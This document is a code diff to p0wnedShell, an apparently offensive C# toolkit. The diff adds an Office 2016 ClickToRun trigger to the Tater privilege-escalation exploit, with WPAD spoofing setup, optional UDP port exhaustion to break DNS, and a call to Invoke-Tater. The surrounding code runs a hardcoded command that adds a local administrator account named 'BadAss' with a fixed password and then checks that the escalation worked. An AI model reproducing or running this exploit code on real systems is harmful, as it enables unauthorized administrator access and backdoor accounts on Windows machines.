@@ -41,13 +41,15 @@ namespace p0wnedShell
             Console.WriteLine();
             Console.WriteLine(" 3. Trigger 2 -> WebClient Service + Scheduled Task (Currently works on Windows 10).");
             Console.WriteLine();
-            Console.WriteLine(" 4. Setup a Remote WPAD Proxy in case Port 80 is in use on target system.");
+            Console.WriteLine(" 4. Trigger 3 -> Office 2016 ClickToRun Updates.");
             Console.WriteLine();
-            Console.WriteLine(" 5. Get-Tater will display queued Tater output.");
+            Console.WriteLine(" 5. Setup a Remote WPAD Proxy in case Port 80 is in use on target system.");
             Console.WriteLine();
-            Console.WriteLine(" 6. Stop-Tater will stop Tater before a successful privilege escalation.");
+            Console.WriteLine(" 6. Get-Tater will display queued Tater output.");
             Console.WriteLine();
-            Console.WriteLine(" 7. Back.");
+            Console.WriteLine(" 7. Stop-Tater will stop Tater before a successful privilege escalation.");
+            Console.WriteLine();
+            Console.WriteLine(" 8. Back.");
             Console.Write("\nEnter choice: ");
 
             int userInput = 0;
@@ -56,7 +58,7 @@ namespace p0wnedShell
                 try
                 {
                     userInput = Convert.ToInt32(Console.ReadLine());
-                    if (userInput < 1 || userInput > 7)
+                    if (userInput < 1 || userInput > 8)
                     {
                         Console.ForegroundColor = ConsoleColor.Red;
                         Console.WriteLine("\n[+] Wrong choice, please try again!\n");
@@ -89,12 +91,15 @@ namespace p0wnedShell
                     Trigger2();
                     break;
                 case 4:
-                    WPADProxy();
+                    Trigger3();
                     break;
                 case 5:
-                    GetTater();
+                    WPADProxy();
                     break;
                 case 6:
+                    GetTater();
+                    break;
+                case 7:
                     StopTater();
                     break;
                 default:
@@ -106,7 +111,7 @@ namespace p0wnedShell
         {
             string Command = "\"net user BadAss FacePalm01 /add && net localgroup administrators BadAss /add\"";
             return Command;
-         }
+        }
 
         public static bool PortInUse(int port)
         {
@@ -466,6 +471,159 @@ namespace p0wnedShell
             try
             {
                 P0wnedListener.Execute(Trigger_2);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+
+            string Admin = "net localgroup administrators";
+            string AdminPower = null;
+            try
+            {
+                AdminPower = Pshell.RunPSCommand(Admin);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+            if (AdminPower.IndexOf("BadAss", 0, StringComparison.OrdinalIgnoreCase) != -1)
+            {
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine("\n[!] You should now be able to login as user \"BadAss\" with passwd \"FacePalm01\"");
+                Console.WriteLine("[!] To make life easier, it should also PopUp a CommandShell with Local Administrator privileges :)\n");
+                Console.ResetColor();
+                Finished();
+            }
+
+            Console.WriteLine("\nPress Enter to Continue...");
+            Console.ReadLine();
+            return;
+        }
+
+        public static void Trigger3()
+        {
+            string[] toPrint = { "* Trigger 3 -> Office 2016 ClickToRun Updates.                      *" };
+            Program.PrintBanner(toPrint);
+
+            IPAddress SpoofIP = IPAddress.Parse("1.1.1.1");
+            int Lport = 80;
+
+            if (PortInUse(Lport))
+            {
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.WriteLine("[!] Port " + Lport + " is already in use, so you need to setup a remote WPAD Proxy.");
+                Console.WriteLine("[!] After running the remote WPAD Proxy, come back and enter the new Spoofed WPAD IP and HTTP Listener Port.\n");
+                Console.ResetColor();
+                Console.WriteLine("Press Enter to Continue...");
+                Console.ReadLine();
+
+                while (true)
+                {
+                    try
+                    {
+                        Console.Write("Enter the IP address of the remote WPAD Proxy (e.g. 192.168.1.1): ");
+                        Console.ForegroundColor = ConsoleColor.Green;
+                        SpoofIP = IPAddress.Parse(Console.ReadLine());
+                        Console.ResetColor();
+                        Console.WriteLine();
+                        break;
+                    }
+                    catch
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine("\n[+] That's not a valid IP address, Please Try again");
+                        Console.ResetColor();
+                    }
+                }
+
+                while (true)
+                {
+                    try
+                    {
+                        Console.Write("Now enter the listening port of the Tater HTTP Listener (e.g. 81 or 8080): ");
+                        Console.ForegroundColor = ConsoleColor.Green;
+                        Lport = int.Parse(Console.ReadLine());
+                        Console.ResetColor();
+                        Console.WriteLine();
+
+                        if (Lport < 1 || Lport > 65535)
+                        {
+                            Console.ForegroundColor = ConsoleColor.Red;
+                            Console.WriteLine("[+] That's not a valid Port, Please Try again\n");
+                            Console.ResetColor();
+                        }
+                        else
+                        {
+                            break;
+                        }
+                    }
+                    catch
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
+                        Console.ResetColor();
+                    }
+                }
+            }
+
+            string WpadHost = "WPAD";
+            Console.Write("Default WPAD entry to spoof is: {0}, do you want to use this?  (y/n) > ", WpadHost);
+
+            string input = Console.ReadLine();
+            switch (input.ToLower())
+            {
+                case "y":
+                    break;
+                case "n":
+                    Console.Write("\nEnter WPAD host entry to spoof (e.g. WPAD.YOURDOMAIN.LOCAL): ");
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    WpadHost = Console.ReadLine();
+                    Console.ResetColor();
+                    break;
+                default:
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("\n [!] Wrong choice, please try again!");
+                    Console.ResetColor();
+                    return;
+            }
+            string Exhaust = "N";
+            Console.Write("\nEnable UDP port exhaustion to force all DNS lookups to fail (Be Cautious)?  (y/n) > ");
+
+            input = Console.ReadLine();
+            switch (input.ToLower())
+            {
+                case "y":
+                    Exhaust = "Y";
+                    break;
+                case "n":
+                    Exhaust = "N";
+                    break;
+                default:
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("\n [!] Wrong choice, please try again!");
+                    Console.ResetColor();
+                    return;
+            }
+
+            string Trigger_3 = null;
+
+            if (PortInUse(80))
+            {
+                Trigger_3 = "Invoke-Tater -Trigger 3 -Command " + TaterCommand() + " -SpooferIP " + SpoofIP + " -HTTPPort " + Lport + " -ExhaustUDP " + Exhaust + " -Hostname " + WpadHost + " -ShowHelp N";
+            }
+            else
+            {
+                Trigger_3 = "Invoke-Tater -Trigger 3 -Command " + TaterCommand() + " -ExhaustUDP " + Exhaust + " -Hostname " + WpadHost + " -ShowHelp N";
+            }
+
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.Write("\n[+] Now please wait while running our exploit\n\n");
+            Console.ResetColor();
+
+            try
+            {
+                P0wnedListener.Execute(Trigger_3);
             }
             catch (Exception e)
             {
